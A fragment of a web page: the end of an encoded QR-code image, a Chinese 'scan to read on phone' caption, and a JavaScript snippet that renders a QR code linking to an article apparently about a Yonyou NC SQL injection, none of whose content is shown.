HCrAMpbQxMvfA4T/Pq6ZMGnhFfGEi4XVN+YSvcAmkVN3kiYJsDbDXgVL/ekO1WfUYwFgLeWrbejxa9s3zRFK+QejiemtdY9eRhaSukXnnlkwb+GRUL6YFdhz2WB85zeYTMqnG0sGpCz6VVjIVU4YrfewfGQvrWep4jwvzERBenB2YPOIeZ1SOoD9Y11SvkFaqmGBA9BfULZ2bVhTOPasD4PFDcAcc1eTVfUFwxvvbCeXMaNEBI/gqrX0gv+C+6pAXw3HkyQ32Jw+AZYJZHAOfxPcMw94BzzRNWM6QLq9qZNt6QI8Ol//s7MC0EvHkw5zjgHGZOXQyuKV5BT4sA9oFZWvxgrefyCLCug3UgrRurT9iEg0CeIJZHOXD3RxZYg5kzE9Z66tNCIl78vjuw/MWwPxk5XvTK4I0feaLD7IteOXOj9bzrtZ44HC/4umDu9fgqg73R0gOznnpYvhqf5fF1vt6QfkfenI9vWf0MMD8J2rQAsw701oe55ggxAuPPYdhZdQGsxdsZ7utwr/U+5TD7wDns3/rAmvyCzlQhrSP1roNnpR6OL/n1huSOfAiffoZkazlrcvC2pUdTXAH2HNXjTb1yr8E8C5xXX43rrMSph6NXTg3m+V2HuQ57Do7BnN4wWIeZU7/ekNyJD+HxGZKn5NGZwFutfrjXNKd6ag72SxMA0QRgfK5M4p8E1vqf0vYPrD05D8x1cA77Z0e84W34LTjSgZtjp+7teZzA+Jnf8IbkCBev7sD4DAFvp28PrIO51zUwGtgjrQKsgzn+ytX/lTgznukBX//MC/aA+cx7VMuZwjDPgjmPL/OuNyR34kN4Wgh4e2Du2wPrObvqMGvgHMzyVID1zHiG09+94FlAL205MP5s7jPgXo8nvA25BdHBvTd5+mtrmGvxhDMjDPYnnxaSpovfdweeWki2FwZvFe6/meRHiTc5uGeVw1xLL1gHc3pTD0sHe6omPQDXk8cHuw6OwRwvzHl6Uw9HF0d7lsHXmL72apCQIWDTUS4vzB5pAqx11YTMrAxzT62tYrC/zgNrYFZtBXB9NTd+sCd593Yd6JYtX3lh96f+1BuyTb2Cv34HxkKA8cEH5lw1WwPrycNArFM/3Oub8RbUGYlvpW1W9M7xRVeeuLNqK3Rfzbsf2M4E9PKWawYwvBGlCcnBdWlC18dCIl78/jswfjF8dAxtUgBvd+VXvSKeaOBeMKcuBmvxhsG6PAI4B7O04LsMngk7Z2bOkxx2D+xx6mKwrngFWNevN2R1t96ojW9ZuX6ehHD0cHTYtxstHthr0cTxhaUF0cC9YI4eX/hIT10MnqFYgDmX1pG54dRh3dt98VcG94I5taPe6w3JHfoQHp8hR9sCbxVmPjt7nwXnvfKDPYqFs/m1Bu4DqnwaA9O3oJjPrqtaRXrAs1KD539RzoxwZlxvSO7Ih/BYCHjTMHO2dsbgnqOfp/eufPGAZ/U8PV1PnroYPEPxCumBex/M2plXsx/V5QnAs3tP8vjGQpJc/P47sPyWlWOBtwprjq8y2JvNg/N44D5PLQz29Bkw6/HLV2PlQfRXGObrwZxn5tm1UgvDekZmXW9I7sSH8PiWlbPAvL1stXP1Jw7HC54VHZz3unJwLd7O8lSA/WCWHxyDWVpF+mGuw5yrB6z9/v17/OUTrHN5Bdjr4BjMqguwzmHWrzdEd+uDMBaSpycM89ZyXpj1+MXgGpjTE5ZHANcVC6qLBcUVYG/VVjGwkpeariP0Iuy/Q6QGjN9Z5BfAea/XPHEY5h7NEVJXLCQfC0kSlkFIHpZWAaS0ceqb8CAAxg8N9zfk0azUK+dysM+F+7j2KE5fZelCNMVC8rA0Qbl4BdVWgPlsy4WsGi/t39yB8bUX5i3BeV6PBvbmqQDn1VPj+KIlF3ct+SMG7iyat0KMwHgzk8sLs5ZaZ3mFrtcc1rNgrWuecL0h9S5+QDwWos08g35e9aw06R3xgZ8Q2LnXeg72Ru+sa3UtOax71SNUX2LpArgXzKmDc3kEcJ66WLqguELaCuAZYyG14YrfewemhYC3BDOfHTHbjgfmXnCeerj3SY8G7kmu2gpgH+zcfZkB9vS8+2seb7jWFMM8s2rgGphVE+A8nxaihgt//w6cXeFbCwFvG3bO0xTuF1/psPcDvWX85wv1AeObkeJHAHv7MFjr3acc1t5+bXmPEG/qyWGeHf1bC8lFLv65O/BjC8mGwZsHc44KzmFm1dPbGeyVpwLudbAG5sxKX/Jw9HB0MaxnxAuugzm6WP2CYgHskSaAc9UqwPqPLaQOv+LX78C0EG1whaPx8p7VVH8G4Kcjs+A8z8z4xStNOqxnrfyw9mqOAK6velWveOTp9eTTQurAK37PHRgLAW8ezvnsiODebDpesA7HHG+4z0gejg/2mdE6957k4N7uVx5PGOxNLo+QHPa6dAGsKa5IT9VqPBZShSt+7x34HwAA//+mKERHAAAABklEQVQDAFeTObzTvijBAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-ebvp-register-qrySubPurchaseOrgByParentPk-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 